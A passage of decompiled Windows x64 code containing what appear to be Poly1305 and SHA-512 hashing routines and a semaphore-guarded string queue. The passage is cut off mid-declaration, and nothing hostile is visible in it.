    v8 = a3 & 0xFFFFFFFFFFFFFFF0uLL;
    sub_140017710(v13, a2, a3 & 0xFFFFFFFFFFFFFFF0uLL);
    v5 += v8;
    v4 &= 0xFu;
  }
  if ( v4 != 0 )
  {
    for ( i = 0; i < v4; ++i )
    {
      v10 = *(_BYTE *)(i + v5);
      v11 = i + v22;
      v21[v11] = v10;
    }
    v22 += v4;
  }
  return sub_140017400((__int64)v13, a1);
}


// ----- sub_140017710 @ 0x140017710 -----
_UNKNOWN **__fastcall sub_140017710(unsigned int *a1, _DWORD *a2, unsigned __int64 a3)
{
  _UNKNOWN **result; // rax
  unsigned int v4; // r9d
  _DWORD *v5; // rdi
  unsigned int v6; // r12d
  unsigned int v7; // r10d
  unsigned int v8; // r11d
  unsigned int v9; // ebx
  __int64 v10; // r8
  __int64 v11; // rdx
  __int64 v12; // r13
  __int64 v13; // rax
  __int64 v14; // rcx
  __int64 v15; // r8
  __int64 v16; // rsi
  unsigned int v17; // eax
  __int64 v18; // rbp
  __int64 v19; // r14
  __int64 v20; // r9
  __int64 v21; // r15
  int v22; // edi
  unsigned __int64 v23; // r12
  unsigned __int64 v24; // r11
  __int64 v25; // r9
  unsigned __int64 v26; // rax
  __int64 v27; // [rsp+0h] [rbp-88h]
  __int64 v28; // [rsp+8h] [rbp-80h]
  __int64 v29; // [rsp+10h] [rbp-78h]
  __int64 v30; // [rsp+18h] [rbp-70h]
  __int64 v31; // [rsp+28h] [rbp-60h]
  __int64 v32; // [rsp+30h] [rbp-58h]
  _UNKNOWN *retaddr; // [rsp+88h] [rbp+0h] BYREF
  unsigned int *v34; // [rsp+90h] [rbp+8h]
  _DWORD *v35; // [rsp+98h] [rbp+10h]
  _UNKNOWN **v36; // [rsp+A0h] [rbp+18h]

  result = &retaddr;
  v36 = (_UNKNOWN **)a3;
  v35 = a2;
  v34 = a1;
  v4 = a1[5];
  v5 = a2;
  v6 = a1[6];
  v7 = a1[7];
  v8 = a1[8];
  v9 = a1[9];
  if ( a3 >= 0x10 )
  {
    v10 = *a1;
    v11 = a1[3];
    v12 = a1[1];
    v13 = a1[4];
    v14 = a1[2];
    v32 = v13;
    v28 = v10;
    v15 = (unsigned int)(5 * v13);
    v27 = v15;
    v30 = (unsigned int)(5 * v11);
    v29 = (unsigned int)(5 * v14);
    v31 = (unsigned int)(5 * v12);
    do
    {
      v16 = v4 + (*v5 & 0x3FFFFFF);
      v17 = v6 + ((*(_DWORD *)((char *)v5 + 3) >> 2) & 0x3FFFFFF);
      v18 = v7 + ((*(_DWORD *)((char *)v5 + 6) >> 4) & 0x3FFFFFF);
      v19 = v8 + (*(_DWORD *)((char *)v5 + 9) >> 6);
      v20 = v15 * v17;
      v21 = v9 + ((v5[3] >> 8) | 0x1000000);
      v22 = v20 + v28 * v16 + v30 * v18 + v29 * v19 + v31 * v21;
      v23 = (unsigned int)((v20
                          + v28 * (unsigned int)v16
                          + v30 * (unsigned int)v18
                          + v29 * (unsigned int)v19
                          + v31 * (unsigned __int64)(unsigned int)v21) >> 26)
          + v28 * v17
          + v12 * (unsigned int)v16
          + v29 * (unsigned int)v21
          + v30 * (unsigned int)v19
          + v27 * (unsigned int)v18;
      v24 = (unsigned int)(v23 >> 26)
          + v28 * (unsigned int)v18
          + v12 * v17
          + v14 * (unsigned int)v16
          + v30 * (unsigned int)v21
          + v27 * (unsigned int)v19;
      v15 = v27;
      v25 = v11 * (unsigned int)v16
          + v14 * v17
          + v12 * (unsigned int)v18
          + v28 * (unsigned int)v19
          + v27 * (unsigned int)v21;
      v7 = ((v23 >> 26) + v28 * v18 + v12 * v17 + v14 * v16 + v30 * v21 + v27 * v19) & 0x3FFFFFF;
      v26 = v32 * v16
          + v11 * v17
          + v14 * v18
          + v12 * v19
          + v28 * v21
          + (unsigned int)((v25 + (unsigned __int64)(unsigned int)(v24 >> 26)) >> 26);
      v8 = (v25 + (v24 >> 26)) & 0x3FFFFFF;
      v9 = v26 & 0x3FFFFFF;
      LODWORD(v25) = (v22 & 0x3FFFFFF) + 5 * (v26 >> 26);
      v5 = v35 + 4;
      LODWORD(v26) = (unsigned int)v25 >> 26;
      v4 = v25 & 0x3FFFFFF;
      v6 = v26 + (v23 & 0x3FFFFFF);
      v35 += 4;
      result = v36 - 2;
      v36 = result;
    }
    while ( (unsigned __int64)result >= 0x10 );
    a1 = v34;
  }
  a1[5] = v4;
  a1[6] = v6;
  a1[7] = v7;
  a1[8] = v8;
  a1[9] = v9;
  return result;
}


// ----- sub_1400179F0 @ 0x1400179f0 -----
void __fastcall sub_1400179F0(__int64 a1, LONG a2)
{
  *(_DWORD *)(a1 + 56) = a2;
  *(_QWORD *)(a1 + 64) = sub_140016FD0(8LL * a2);
  *(_QWORD *)a1 = CreateSemaphoreA(nullptr, a2, a2, nullptr);
  *(_QWORD *)(a1 + 8) = CreateSemaphoreA(nullptr, 0, a2, nullptr);
  *(_QWORD *)(a1 + 72) = 0;
  InitializeCriticalSection((LPCRITICAL_SECTION)(a1 + 16));
}


// ----- sub_140017A60 @ 0x140017a60 -----
__int64 __fastcall sub_140017A60(__int64 a1, int a2, _DWORD *a3)
{
  __int64 v6; // r8
  __int64 v7; // rdi

  *a3 = 0;
  if ( WaitForSingleObject(*(HANDLE *)(a1 + 8), 0) == 0 )
    goto LABEL_4;
  if ( a2 != 0 )
  {
    WaitForSingleObject(*(HANDLE *)(a1 + 8), 0xFFFFFFFF);
LABEL_4:
    EnterCriticalSection((LPCRITICAL_SECTION)(a1 + 16));
    v6 = *(int *)(a1 + 76);
    v7 = *(_QWORD *)(*(_QWORD *)(a1 + 64) + 8 * v6);
    *(_DWORD *)(a1 + 76) = ((int)v6 + 1) % *(_DWORD *)(a1 + 56);
    LeaveCriticalSection((LPCRITICAL_SECTION)(a1 + 16));
    ReleaseSemaphore(*(HANDLE *)a1, 1, nullptr);
    return v7;
  }
  *a3 = -1;
  return 0;
}


// ----- sub_140017B10 @ 0x140017b10 -----
__int64 __fastcall sub_140017B10(__int64 a1, const WCHAR *a2, int a3)
{
  LPVOID v6; // r14
  unsigned __int64 v7; // rbx

  if ( WaitForSingleObject(*(HANDLE *)a1, 0) != 0 )
  {
    if ( a3 == 0 )
      return 0;
    WaitForSingleObject(*(HANDLE *)a1, 0xFFFFFFFF);
  }
  EnterCriticalSection((LPCRITICAL_SECTION)(a1 + 16));
  v6 = nullptr;
  if ( a2 != nullptr )
  {
    v7 = 2 * lstrlenW(a2) + 2;
    v6 = sub_140016FD0(v7);
    sub_140016F80((__int64)v6, (__int64)a2, v7);
  }
  *(_QWORD *)(*(_QWORD *)(a1 + 64) + 8LL * *(int *)(a1 + 72)) = v6;
  *(_DWORD *)(a1 + 72) = (*(_DWORD *)(a1 + 72) + 1) % *(_DWORD *)(a1 + 56);
  LeaveCriticalSection((LPCRITICAL_SECTION)(a1 + 16));
  ReleaseSemaphore(*(HANDLE *)(a1 + 8), 1, nullptr);
  return 1;
}


// ----- sub_140017C00 @ 0x140017c00 -----
__int64 __fastcall sub_140017C00(__int64 a1, const WCHAR *a2, DWORD a3)
{
  LPVOID v6; // r14
  unsigned __int64 v7; // rbx

  if ( WaitForSingleObject(*(HANDLE *)a1, a3) != 0 )
    return 0;
  EnterCriticalSection((LPCRITICAL_SECTION)(a1 + 16));
  v6 = nullptr;
  if ( a2 != nullptr )
  {
    v7 = 2 * lstrlenW(a2) + 2;
    v6 = sub_140016FD0(v7);
    sub_140016F80((__int64)v6, (__int64)a2, v7);
  }
  *(_QWORD *)(*(_QWORD *)(a1 + 64) + 8LL * *(int *)(a1 + 72)) = v6;
  *(_DWORD *)(a1 + 72) = (*(_DWORD *)(a1 + 72) + 1) % *(_DWORD *)(a1 + 56);
  LeaveCriticalSection((LPCRITICAL_SECTION)(a1 + 16));
  ReleaseSemaphore(*(HANDLE *)(a1 + 8), 1, nullptr);
  return 1;
}


// ----- sub_140017D60 @ 0x140017d60 -----
__int64 __fastcall sub_140017D60(int *a1, __int64 a2, int a3)
{
  __int64 v3; // rbx
  int v4; // edi
  __int64 v5; // r14
  unsigned int v6; // eax
  int *v7; // rsi
  unsigned int v8; // ecx
  __int64 v9; // rcx
  int v10; // eax
  __int64 result; // rax
  int v12; // eax
  int v13; // ecx
  int v14; // eax
  int v15; // ecx
  int v16; // eax
  int v17; // ecx
  int v18; // eax
  int v19; // ecx
  int v20; // eax
  int v21; // eax
  int v22; // ecx
  int v23; // eax
  int v24; // ecx
  int v25; // eax
  int v26; // ecx
  int v27; // eax
  int v28; // ecx
  int v29; // eax
  int v30; // ecx
  int v31; // eax
  int v32; // ecx
  int v33; // eax
  int v34; // ecx
  int v35; // eax
  int v36; // ecx
  int v37; // eax
  int v38; // ecx
  int v39; // eax
  int v40; // ecx
  int v41; // eax
  int v42; // ecx
  int v43; // eax
  int v44; // ecx
  int v45; // eax
  int v46; // ecx
  int v47; // eax
  int v48; // ecx
  int v49; // eax
  int v50; // ecx
  int v51; // eax
  int v52; // ecx
  int v53; // eax
  int v54; // ecx
  int v55; // eax
  int v56; // ecx
  int v57; // eax
  int v58; // ecx
  int v59; // eax
  int v60; // ecx
  int v61; // eax
  int v62; // eax
  int v63; // ecx
  int v64; // eax
  int v65; // ecx
  int v66; // eax
  __int64 v67; // rax
  _DWORD v68[44]; // [rsp+20h] [rbp-59h] BYREF

  v3 = (__int64)a1;
  v4 = a3;
  a1[49] += a3;
  v5 = a2;
  v6 = a1[49] < (unsigned int)a3;
  v7 = a1 + 48;
  a1[50] += v6;
  v8 = a1[50] < v6;
  *(_DWORD *)(v3 + 204) += v8;
  *(_DWORD *)(v3 + 208) += *(_DWORD *)(v3 + 204) < v8;
  v9 = *v7;
  v10 = v9 + a3;
  if ( (_DWORD)v9 != 0 )
  {
    if ( v10 < 128 )
    {
      result = sub_140016F80(v3 + v9 + 64, a2, a3);
      *v7 += v4;
      return result;
    }
    goto LABEL_5;
  }
  if ( v10 >= 128 )
  {
    do
    {
LABEL_5:
      sub_140016F80(v3 + (int)v9 + 64LL, v5, 128 - (int)v9);
      v4 += *v7 - 128;
      v5 += 128 - *v7;
      v12 = *(unsigned __int8 *)(v3 + 69);
      v68[0] = *(unsigned __int8 *)(v3 + 67)
             | ((*(unsigned __int8 *)(v3 + 66)
               | ((*(unsigned __int8 *)(v3 + 65) | (*(unsigned __int8 *)(v3 + 64) << 8)) << 8)) << 8);
      v13 = *(unsigned __int8 *)(v3 + 71)
          | ((*(unsigned __int8 *)(v3 + 70) | ((v12 | (*(unsigned __int8 *)(v3 + 68) << 8)) << 8)) << 8);
      v14 = *(unsigned __int8 *)(v3 + 73);
      v68[1] = v13;
      v15 = *(unsigned __int8 *)(v3 + 75)
          | ((*(unsigned __int8 *)(v3 + 74) | ((v14 | (*(unsigned __int8 *)(v3 + 72) << 8)) << 8)) << 8);
      v16 = *(unsigned __int8 *)(v3 + 77);
      v68[2] = v15;
      v17 = *(unsigned __int8 *)(v3 + 79)
          | ((*(unsigned __int8 *)(v3 + 78) | ((v16 | (*(unsigned __int8 *)(v3 + 76) << 8)) << 8)) << 8);
      v18 = *(unsigned __int8 *)(v3 + 81);
      v68[3] = v17;
      v19 = *(unsigned __int8 *)(v3 + 83)
          | ((*(unsigned __int8 *)(v3 + 82) | ((v18 | (*(unsigned __int8 *)(v3 + 80) << 8)) << 8)) << 8);
      v20 = *(unsigned __int8 *)(v3 + 85);
      v68[4] = v19;
      v68[5] = *(unsigned __int8 *)(v3 + 87)
             | ((*(unsigned __int8 *)(v3 + 86) | ((v20 | (*(unsigned __int8 *)(v3 + 84) << 8)) << 8)) << 8);
      v21 = *(unsigned __int8 *)(v3 + 93);
      v68[6] = *(unsigned __int8 *)(v3 + 91)
             | ((*(unsigned __int8 *)(v3 + 90)
               | ((*(unsigned __int8 *)(v3 + 89) | (*(unsigned __int8 *)(v3 + 88) << 8)) << 8)) << 8);
      v22 = *(unsigned __int8 *)(v3 + 95)
          | ((*(unsigned __int8 *)(v3 + 94) | ((v21 | (*(unsigned __int8 *)(v3 + 92) << 8)) << 8)) << 8);
      v23 = *(unsigned __int8 *)(v3 + 97);
      v68[7] = v22;
      v24 = *(unsigned __int8 *)(v3 + 99)
          | ((*(unsigned __int8 *)(v3 + 98) | ((v23 | (*(unsigned __int8 *)(v3 + 96) << 8)) << 8)) << 8);
      v25 = *(unsigned __int8 *)(v3 + 101);
      v68[8] = v24;
      v26 = *(unsigned __int8 *)(v3 + 103)
          | ((*(unsigned __int8 *)(v3 + 102) | ((v25 | (*(unsigned __int8 *)(v3 + 100) << 8)) << 8)) << 8);
      v27 = *(unsigned __int8 *)(v3 + 105);
      v68[9] = v26;
      v28 = *(unsigned __int8 *)(v3 + 107)
          | ((*(unsigned __int8 *)(v3 + 106) | ((v27 | (*(unsigned __int8 *)(v3 + 104) << 8)) << 8)) << 8);
      v29 = *(unsigned __int8 *)(v3 + 109);
      v68[10] = v28;
      v30 = *(unsigned __int8 *)(v3 + 111)
          | ((*(unsigned __int8 *)(v3 + 110) | ((v29 | (*(unsigned __int8 *)(v3 + 108) << 8)) << 8)) << 8);
      v31 = *(unsigned __int8 *)(v3 + 113);
      v68[11] = v30;
      v32 = *(unsigned __int8 *)(v3 + 115)
          | ((*(unsigned __int8 *)(v3 + 114) | ((v31 | (*(unsigned __int8 *)(v3 + 112) << 8)) << 8)) << 8);
      v33 = *(unsigned __int8 *)(v3 + 117);
      v68[12] = v32;
      v34 = *(unsigned __int8 *)(v3 + 119)
          | ((*(unsigned __int8 *)(v3 + 118) | ((v33 | (*(unsigned __int8 *)(v3 + 116) << 8)) << 8)) << 8);
      v35 = *(unsigned __int8 *)(v3 + 121);
      v68[13] = v34;
      v36 = *(unsigned __int8 *)(v3 + 123)
          | ((*(unsigned __int8 *)(v3 + 122) | ((v35 | (*(unsigned __int8 *)(v3 + 120) << 8)) << 8)) << 8);
      v37 = *(unsigned __int8 *)(v3 + 125);
      v68[14] = v36;
      v38 = *(unsigned __int8 *)(v3 + 127)
          | ((*(unsigned __int8 *)(v3 + 126) | ((v37 | (*(unsigned __int8 *)(v3 + 124) << 8)) << 8)) << 8);
      v39 = *(unsigned __int8 *)(v3 + 129);
      v68[15] = v38;
      v40 = *(unsigned __int8 *)(v3 + 131)
          | ((*(unsigned __int8 *)(v3 + 130) | ((v39 | (*(unsigned __int8 *)(v3 + 128) << 8)) << 8)) << 8);
      v41 = *(unsigned __int8 *)(v3 + 133);
      v68[16] = v40;
      v42 = *(unsigned __int8 *)(v3 + 135)
          | ((*(unsigned __int8 *)(v3 + 134) | ((v41 | (*(unsigned __int8 *)(v3 + 132) << 8)) << 8)) << 8);
      v43 = *(unsigned __int8 *)(v3 + 137);
      v68[17] = v42;
      v44 = *(unsigned __int8 *)(v3 + 139)
          | ((*(unsigned __int8 *)(v3 + 138) | ((v43 | (*(unsigned __int8 *)(v3 + 136) << 8)) << 8)) << 8);
      v45 = *(unsigned __int8 *)(v3 + 141);
      v68[18] = v44;
      v46 = *(unsigned __int8 *)(v3 + 143)
          | ((*(unsigned __int8 *)(v3 + 142) | ((v45 | (*(unsigned __int8 *)(v3 + 140) << 8)) << 8)) << 8);
      v47 = *(unsigned __int8 *)(v3 + 145);
      v68[19] = v46;
      v48 = *(unsigned __int8 *)(v3 + 147)
          | ((*(unsigned __int8 *)(v3 + 146) | ((v47 | (*(unsigned __int8 *)(v3 + 144) << 8)) << 8)) << 8);
      v49 = *(unsigned __int8 *)(v3 + 149);
      v68[20] = v48;
      v50 = *(unsigned __int8 *)(v3 + 151)
          | ((*(unsigned __int8 *)(v3 + 150) | ((v49 | (*(unsigned __int8 *)(v3 + 148) << 8)) << 8)) << 8);
      v51 = *(unsigned __int8 *)(v3 + 153);
      v68[21] = v50;
      v52 = *(unsigned __int8 *)(v3 + 155)
          | ((*(unsigned __int8 *)(v3 + 154) | ((v51 | (*(unsigned __int8 *)(v3 + 152) << 8)) << 8)) << 8);
      v53 = *(unsigned __int8 *)(v3 + 157);
      v68[22] = v52;
      v54 = *(unsigned __int8 *)(v3 + 159)
          | ((*(unsigned __int8 *)(v3 + 158) | ((v53 | (*(unsigned __int8 *)(v3 + 156) << 8)) << 8)) << 8);
      v55 = *(unsigned __int8 *)(v3 + 161);
      v68[23] = v54;
      v56 = *(unsigned __int8 *)(v3 + 163)
          | ((*(unsigned __int8 *)(v3 + 162) | ((v55 | (*(unsigned __int8 *)(v3 + 160) << 8)) << 8)) << 8);
      v57 = *(unsigned __int8 *)(v3 + 165);
      v68[24] = v56;
      v58 = *(unsigned __int8 *)(v3 + 167)
          | ((*(unsigned __int8 *)(v3 + 166) | ((v57 | (*(unsigned __int8 *)(v3 + 164) << 8)) << 8)) << 8);
      v59 = *(unsigned __int8 *)(v3 + 169);
      v68[25] = v58;
      v60 = *(unsigned __int8 *)(v3 + 171)
          | ((*(unsigned __int8 *)(v3 + 170) | ((v59 | (*(unsigned __int8 *)(v3 + 168) << 8)) << 8)) << 8);
      v61 = *(unsigned __int8 *)(v3 + 173);
      v68[26] = v60;
      v68[27] = *(unsigned __int8 *)(v3 + 175)
              | ((*(unsigned __int8 *)(v3 + 174) | ((v61 | (*(unsigned __int8 *)(v3 + 172) << 8)) << 8)) << 8);
      v62 = *(unsigned __int8 *)(v3 + 181);
      v68[28] = *(unsigned __int8 *)(v3 + 179)
              | ((*(unsigned __int8 *)(v3 + 178)
                | ((*(unsigned __int8 *)(v3 + 177) | (*(unsigned __int8 *)(v3 + 176) << 8)) << 8)) << 8);
      v63 = *(unsigned __int8 *)(v3 + 183)
          | ((*(unsigned __int8 *)(v3 + 182) | ((v62 | (*(unsigned __int8 *)(v3 + 180) << 8)) << 8)) << 8);
      v64 = *(unsigned __int8 *)(v3 + 185);
      v68[29] = v63;
      v65 = *(unsigned __int8 *)(v3 + 187)
          | ((*(unsigned __int8 *)(v3 + 186) | ((v64 | (*(unsigned __int8 *)(v3 + 184) << 8)) << 8)) << 8);
      v66 = *(unsigned __int8 *)(v3 + 189);
      v68[30] = v65;
      v68[31] = *(unsigned __int8 *)(v3 + 191)
              | ((*(unsigned __int8 *)(v3 + 190) | ((v66 | (*(unsigned __int8 *)(v3 + 188) << 8)) << 8)) << 8);
      sub_1400187F0(v3, v68);
      *v7 = 0;
      LODWORD(v9) = 0;
    }
    while ( v4 >= 128 );
    v67 = 64;
    goto LABEL_8;
  }
  v67 = v3;
  v3 = 64;
LABEL_8:
  result = sub_140016F80(v67 + v3, v5, v4);
  *v7 = v4;
  return result;
}


// ----- sub_140018390 @ 0x140018390 -----
__int64 __fastcall sub_140018390(__int64 a1, _BYTE *a2)
{
  int v2; // eax
  unsigned int v5; // esi
  int v6; // ebx
  unsigned __int64 v7; // xmm1_8
  int v8; // ecx
  int v9; // edx
  int v10; // ecx
  int v11; // edx
  int v12; // ecx
  int v13; // edx
  int v14; // ecx
  int v15; // edx
  int v16; // ecx
  int v17; // edx
  int v18; // ecx
  int v19; // edx
  int v20; // ecx
  int v21; // edx
  int v22; // ecx
  unsigned int v23; // edx
  unsigned __int64 v25; // [rsp+24h] [rbp-65h]
  int v26; // [rsp+2Ch] [rbp-5Dh]
  _BYTE v27[176]; // [rsp+30h] [rbp-59h] BYREF

  v2 = *(_DWORD *)(a1 + 192);
  v5 = *(_DWORD *)(a1 + 196);
  v6 = 240 - v2;
  v7 = _mm_srli_epi32(_mm_loadl_epi64((const __m128i *)(a1 + 196)), 0x1Du).m128i_u64[0]
     | _mm_slli_epi32(_mm_loadl_epi64((const __m128i *)(a1 + 200)), 3u).m128i_u64[0];
  if ( v2 < 112 )
    v6 = 112 - v2;
  v25 = v7;
  v26 = *(__int64 *)(a1 + 204) >> 29;
  sub_140016F40((__int64)v27, 0, v6);
  v27[0] = 0x80;
  sub_140017D60((int *)a1, (__int64)v27, v6);
  v27[0] = HIBYTE(v26);
  v27[1] = BYTE2(v26);
  v27[2] = BYTE1(v26);
  v27[4] = HIBYTE(v25);
  v27[5] = BYTE6(v25);
  v27[6] = BYTE5(v25);
  v27[7] = BYTE4(v25);
  v27[8] = BYTE3(v25);
  v27[9] = BYTE2(v25);
  v27[10] = BYTE1(v25);
  v27[11] = v25;
  v27[12] = (8 * v5) >> 24;
  v27[13] = v5 >> 13;
  v27[14] = (unsigned __int16)v5 >> 5;
  v27[3] = v26;
  v27[15] = 8 * v5;
  sub_140017D60((int *)a1, (__int64)v27, 16);
  v8 = *(_DWORD *)a1;
  v9 = *(_DWORD *)(a1 + 4);
  *a2 = HIBYTE(*(_DWORD *)a1);
  a2[1] = BYTE2(v8);
  a2[2] = BYTE1(v8);
  a2[3] = v8;
  a2[4] = HIBYTE(v9);
  a2[5] = BYTE2(v9);
  a2[6] = BYTE1(v9);
  a2[7] = v9;
  v10 = *(_DWORD *)(a1 + 8);
  v11 = *(_DWORD *)(a1 + 12);
  a2[8] = HIBYTE(v10);
  a2[9] = BYTE2(v10);
  a2[10] = BYTE1(v10);
  a2[12] = HIBYTE(v11);
  a2[13] = BYTE2(v11);
  a2[14] = BYTE1(v11);
  a2[11] = v10;
  a2[15] = v11;
  v12 = *(_DWORD *)(a1 + 16);
  v13 = *(_DWORD *)(a1 + 20);
  a2[16] = HIBYTE(v12);
  a2[17] = BYTE2(v12);
  a2[18] = BYTE1(v12);
  a2[20] = HIBYTE(v13);
  a2[21] = BYTE2(v13);
  a2[22] = BYTE1(v13);
  a2[19] = v12;
  a2[23] = v13;
  v14 = *(_DWORD *)(a1 + 24);
  v15 = *(_DWORD *)(a1 + 28);
  a2[24] = HIBYTE(v14);
  a2[25] = BYTE2(v14);
  a2[26] = BYTE1(v14);
  a2[28] = HIBYTE(v15);
  a2[29] = BYTE2(v15);
  a2[30] = BYTE1(v15);
  a2[27] = v14;
  a2[31] = v15;
  v16 = *(_DWORD *)(a1 + 32);
  v17 = *(_DWORD *)(a1 + 36);
  a2[32] = HIBYTE(v16);
  a2[33] = BYTE2(v16);
  a2[34] = BYTE1(v16);
  a2[36] = HIBYTE(v17);
  a2[37] = BYTE2(v17);
  a2[38] = BYTE1(v17);
  a2[35] = v16;
  a2[39] = v17;
  v18 = *(_DWORD *)(a1 + 40);
  v19 = *(_DWORD *)(a1 + 44);
  a2[40] = HIBYTE(v18);
  a2[41] = BYTE2(v18);
  a2[42] = BYTE1(v18);
  a2[44] = HIBYTE(v19);
  a2[45] = BYTE2(v19);
  a2[46] = BYTE1(v19);
  a2[43] = v18;
  a2[47] = v19;
  v20 = *(_DWORD *)(a1 + 48);
  v21 = *(_DWORD *)(a1 + 52);
  a2[48] = HIBYTE(v20);
  a2[49] = BYTE2(v20);
  a2[50] = BYTE1(v20);
  a2[52] = HIBYTE(v21);
  a2[53] = BYTE2(v21);
  a2[54] = BYTE1(v21);
  a2[51] = v20;
  a2[55] = v21;
  v22 = *(_DWORD *)(a1 + 56);
  v23 = *(_DWORD *)(a1 + 60);
  a2[56] = HIBYTE(v22);
  a2[57] = BYTE2(v22);
  a2[58] = BYTE1(v22);
  a2[60] = HIBYTE(v23);
  a2[61] = BYTE2(v23);
  a2[62] = BYTE1(v23);
  a2[59] = v22;
  a2[63] = v23;
  return v23 >> 8;
}


// ----- sub_1400186F0 @ 0x1400186f0 -----
__int64 __fastcall sub_1400186F0(__int64 a1, int a2, _BYTE *a3)
{
  __m512 v5[3]; // [rsp+20h] [rbp-E8h] BYREF
  __int64 v6; // [rsp+E0h] [rbp-28h]
  __int64 v7; // [rsp+E8h] [rbp-20h]
  int v8; // [rsp+F0h] [rbp-18h]

  v5[0] = zmmword_140002C70;
  v6 = 0;
  v7 = 0;
  v8 = 0;
  sub_140017D60((int *)v5, a1, a2);
  return sub_140018390((__int64)v5, a3);
}


// ----- sub_1400187F0 @ 0x1400187f0 -----
__int64 __fastcall sub_1400187F0(unsigned __int64 *a1, _OWORD *a2)
{
  __int64 v2; // rax
  __int128 v3; // xmm1
  __int128 v4; // xmm0
  __int128 v5; // xmm1
  __int128 v6; // xmm0
  __int128 v7; // xmm1
  __int128 v8; // xmm0
  __int128 v9; // xmm1
  unsigned int v10; // esi
  unsigned int v11; // r13d
  unsigned int v12; // r14d
  unsigned int v13; // r12d
  unsigned int v14; // r8d
  unsigned int v15; // r10d
  int v16; // ebx
  unsigned int v17; // r11d
  unsigned int v18; // r9d
  BOOL v19; // edi
  unsigned int v20; // r15d
  int v21; // r14d
  unsigned int v22; // esi
  unsigned int v23; // ebx
  int v24; // r14d
  unsigned int v25; // r9d
  unsigned int v26; // r14d
  int v27; // r11d
  unsigned int v28; // r10d
  unsigned int v29; // r8d
  unsigned __int64 v30; // rdx
  unsigned __int64 v31; // r8
  unsigned __int64 v32; // r11
  unsigned __int64 v33; // rdi
  unsigned __int64 v34; // r14
  unsigned __int64 v35; // r10
  unsigned __int64 v36; // rsi
  unsigned __int64 v37; // rax
  unsigned __int64 v38; // rbx
  unsigned int v39; // r13d
  unsigned __int64 v40; // rcx
  unsigned int v41; // r12d
  __int64 v42; // rdx
  unsigned int v43; // edi
  unsigned int v44; // r14d
  unsigned int v45; // r8d
  int v46; // r11d
  unsigned int v47; // r11d
  int v48; // eax
  unsigned int v49; // r8d
  unsigned int v50; // r9d
  unsigned int v51; // r10d
  unsigned int v52; // ecx
  unsigned int v53; // esi
  int v54; // ebx
  unsigned int v55; // edi
  unsigned int v56; // r13d
  int v57; // ecx
  unsigned int v58; // r11d
  unsigned int v59; // r10d
  unsigned int v60; // r8d
  unsigned int v61; // r9d
  unsigned int v62; // ecx
  unsigned int v63; // esi
  int v64; // edi
  unsigned int v65; // ebx
  int v66; // ecx
  unsigned int v67; // r14d
  unsigned int v68; // eax
  int v69; // r11d
  unsigned int v70; // r10d
  unsigned int v71; // r8d
  unsigned int v72; // r9d
  unsigned int v73; // ecx
  unsigned int v74; // esi
  int v75; // ebx
  unsigned int v76; // edi
  int v77; // ecx
  unsigned int v78; // r15d
  unsigned int v79; // eax
  unsigned int v80; // r12d
  int v81; // r11d
  unsigned int v82; // r10d
  unsigned int v83; // r8d
  unsigned int v84; // r9d
  unsigned int v85; // ecx
  unsigned int v86; // esi
  int v87; // ebx
  unsigned int v88; // edi
  int v89; // ecx
  unsigned int v90; // r12d
  unsigned int v91; // eax
  unsigned int v92; // r11d
  unsigned int v93; // r10d
  unsigned int v94; // r8d
  unsigned int v95; // r9d
  unsigned int v96; // ecx
  unsigned int v97; // esi
  int v98; // ebx
  unsigned int v99; // edi
  int v100; // ecx
  int v101; // r11d
  unsigned int v102; // r10d
  unsigned int v103; // r8d
  unsigned int v104; // r9d
  unsigned int v105; // ecx
  unsigned int v106; // esi
  int v107; // ebx
  unsigned int v108; // edi
  int v109; // ecx
  int v110; // r11d
  unsigned int v111; // r10d
  unsigned int v112; // r8d
  unsigned int v113; // r9d
  unsigned int v114; // ecx
  unsigned int v115; // esi
  int v116; // ebx
  unsigned int v117; // edi
  int v118; // ecx
  int v119; // r11d
  unsigned int v120; // r10d
  unsigned int v121; // r8d
  unsigned int v122; // r9d
  unsigned int v123; // ecx
  unsigned int v124; // esi
  int v125; // edi
  unsigned int v126; // ebx
  unsigned int v127; // r15d
  int v128; // r11d
  bool v129; // cf
  unsigned int v130; // eax
  unsigned int v131; // r10d
  int v132; // r8d
  int v133; // eax
  int v134; // r8d
  int v135; // r8d
  int v136; // r8d
  unsigned int v137; // ecx
  unsigned int v138; // eax
  unsigned int v139; // eax
  unsigned int v140; // eax
  __int64 result; // rax
  unsigned int v142; // [rsp+0h] [rbp-100h]
  unsigned int v143; // [rsp+0h] [rbp-100h]
  unsigned int v144; // [rsp+4h] [rbp-FCh]
  unsigned int v145; // [rsp+4h] [rbp-FCh]
  unsigned int v146; // [rsp+8h] [rbp-F8h]
  unsigned int v147; // [rsp+8h] [rbp-F8h]
  __int64 v148; // [rsp+Ch] [rbp-F4h]
  unsigned int v149; // [rsp+14h] [rbp-ECh]
  unsigned int v150; // [rsp+14h] [rbp-ECh]
  unsigned int v151; // [rsp+18h] [rbp-E8h]
  unsigned int v152; // [rsp+18h] [rbp-E8h]
  unsigned int v153; // [rsp+1Ch] [rbp-E4h]
  unsigned int v154; // [rsp+1Ch] [rbp-E4h]
  unsigned int v155; // [rsp+20h] [rbp-E0h]
  unsigned int v156; // [rsp+20h] [rbp-E0h]
  __int64 v157; // [rsp+28h] [rbp-D8h]
  unsigned int v158; // [rsp+30h] [rbp-D0h]
  unsigned int v159; // [rsp+30h] [rbp-D0h]
  unsigned int v160; // [rsp+34h] [rbp-CCh]
  unsigned int v161; // [rsp+38h] [rbp-C8h]
  unsigned int v162; // [rsp+38h] [rbp-C8h]
  unsigned int v163; // [rsp+3Ch] [rbp-C4h]
  unsigned int v164; // [rsp+40h] [rbp-C0h]
  unsigned int v165; // [rsp+44h] [rbp-BCh]
  unsigned int v166; // [rsp+48h] [rbp-B8h]
  unsigned int v167; // [rsp+4Ch] [rbp-B4h]
  unsigned int v168; // [rsp+50h] [rbp-B0h]
  unsigned int v169; // [rsp+54h] [rbp-ACh]
  unsigned int v170; // [rsp+58h] [rbp-A8h]
  unsigned int v171; // [rsp+5Ch] [rbp-A4h]
  unsigned int v172; // [rsp+60h] [rbp-A0h]
  unsigned int v173; // [rsp+64h] [rbp-9Ch]
  unsigned int v174; // [rsp+68h] [rbp-98h]
  unsigned int v175; // [rsp+6Ch] [rbp-94h]
  unsigned __int64 v176; // [rsp+70h] [rbp-90h]
  unsigned __int64 v177; // [rsp+80h] [rbp-80h]
  unsigned __int64 v178; // [rsp+88h] [rbp-78h]
  unsigned __int64 v179; // [rsp+90h] [rbp-70h]
  unsigned __int64 v180; // [rsp+98h] [rbp-68h]
  unsigned __int64 v181; // [rsp+A0h] [rbp-60h]
